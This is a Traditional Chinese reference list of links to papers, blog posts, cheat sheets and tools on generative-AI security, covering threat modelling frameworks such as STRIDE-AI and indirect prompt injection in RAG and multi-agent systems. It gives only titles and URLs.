- [[arXiv] 學術論文 - STRIDE-AI：生成式 AI 系統安全評估的專用威脅建模框架](https://arxiv.org/abs/2605.17163)
- [[arXiv] 學術論文 - 多 Agent 機器人系統面臨的 Prompt 注入安全挑戰](https://arxiv.org/html/2608.00747v2?spm=a2ty_o01.29997173.0.0.4ac755fbRoKlfA&file=2608.00747v2)
- [[arXiv] 學術論文 - 多 Agent 系統中執行任意惡意代碼之安全性漏洞分析](https://arxiv.org/html/2503.12188v2)
- [[arXiv] 學術論文 - 視覺混淆代理人：電腦使用 Agent perception 缺陷之漏洞利用與防禦](https://arxiv.org/html/2603.14707v1)
- [[arXiv] 學術論文 - 跨越檢索障礙：針對 LLM 系統中真實世界的間接注入攻擊研究](https://arxiv.org/pdf/2601.07072)
- [[ioSENTRIX] 技術指南 - 機器學習管線風險對照與威脅建模](https://iosentrix.com/blog/ai-system-threat-modeling)
- [[mrwadams] GitHub 專案 - stride-gpt 基於 GPT 之 STRIDE 自動化威脅建模工具](https://github.com/mrwadams/stride-gpt)
- [[安全指南] 備忘清單 - 檢索增強生成 (RAG) 安全實踐速查表](https://cheatsheetseries.owasp.org/cheatsheets/RAG_Security_Cheat_Sheet.html)
- [[技術部落格] 安全評估 - RAG 資訊安全：經常被遺忘的隱蔽攻擊面分析](https://christian-schneider.net/blog/rag-security-forgotten-attack-surface/)
- [[技術部落格] 安全評估 - 跨 AI Agent 的 Prompt 注入防禦成效評估](https://nhimg.org/community/nhi-breaches/prompt-injection-across-ai-agents-are-your-controls-keeping-up/)
- [[技術部落格] 技術分析 - 檢索管線脆弱性與間接 Prompt 注入攻擊對 RAG 之威脅](https://neuralstackms.tech/rag-under-fire-retrieval-pipeline-vulnerabilities-indirect-prompt-injection)
- [[技術部落格] 架構介紹 - 解密生成式 AI 安全：STRIDE-AI 威脅建模框架簡介](https://arsa.technology/machine-state/securing-generative-ai-introducing-the-stride-ai-t-uujnqqxm/)
- [[技術部落格] 架構分析 - RAG 系統與 AI Agent 的隱蔽間接 Prompt 注入](https://aquilax.ai/blog/indirect-prompt-injection-rag-agents)
- [[技術部落格] 比較分析 - NIST AI RMF 與 MITRE ATLAS 框架定位與功能差異](https://aisecurityandsafety.org/en/compare/nist-ai-rmf-vs-mitre-atlas/)
- [[部落格文章] 案例研究 - 網頁端間接 Prompt 注入攻擊野外實錄](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/)
- [http://ieeexplore.ieee.org/document/9527917/](http://ieeexplore.ieee.org/document/9527917/)
- [https://idanhabler.medium.com/demystifying-owasp-top-10-for-agentic-ai-36aee157a3f9](https://idanhabler.medium.com/demystifying-owasp-top-10-for-agentic-ai-36aee157a3f9)
- [https://medium.com/@tanishch21/%EF%B8%8F-ai-threat-modeling-isnt-optional-anymore-understanding-stride-mitre-atlas-and-owasp-llm-a620d67f7a6a](https://medium.com/@tanishch21/%EF%B8%8F-ai-threat-modeling-isnt-optional-anymore-understanding-stride-mitre-atlas-and-owasp-llm-a620d67f7a6a)
- [https://www.researchgate.net/publication/389918149_Multi-Agent_Systems_Execute_Arbitrary_Malicious_Code](https://www.researchgate.net/publication/389918149_Multi-Agent_Systems_Execute_Arbitrary_Malicious_Code)
- [https://www.scribd.com/document/1027689342/AI-Threat-Modelling](https://www.scribd.com/document/1027689342/AI-Threat-Modelling)
